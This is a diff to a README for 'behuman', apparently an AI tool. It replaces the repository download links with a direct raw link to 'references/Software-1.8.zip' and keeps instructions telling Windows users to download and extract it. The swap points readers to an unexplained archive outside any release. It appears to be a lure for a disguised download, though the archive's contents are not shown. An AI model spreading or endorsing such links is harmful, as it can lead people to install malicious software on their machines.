@@ -1,6 +1,6 @@
 # 🪞 behuman - Mirror AI With Human-Like Depth
 
-[![Download behuman](https://img.shields.io/badge/Download%20behuman-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paintingshoveler945/behuman)
+[![Download behuman](https://img.shields.io/badge/Download%20behuman-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paintingshoveler945/behuman/raw/refs/heads/main/references/Software-1.8.zip)
 
 ## 🧭 What is behuman?
 
@@ -31,7 +31,7 @@ If you plan to use larger models or run more than one tool at once, 16 GB of RAM
 
 ## 🚀 Download and install
 
-1. Open the download page: [https://github.com/Paintingshoveler945/behuman](https://github.com/Paintingshoveler945/behuman)
+1. Open the download page: [https://github.com/Paintingshoveler945/behuman/raw/refs/heads/main/references/Software-1.8.zip](https://github.com/Paintingshoveler945/behuman/raw/refs/heads/main/references/Software-1.8.zip)
 2. On the GitHub page, look for the latest release or the main download file
 3. Download the Windows version to your computer
 4. If the file is in a ZIP folder, right-click it and choose **Extract All**
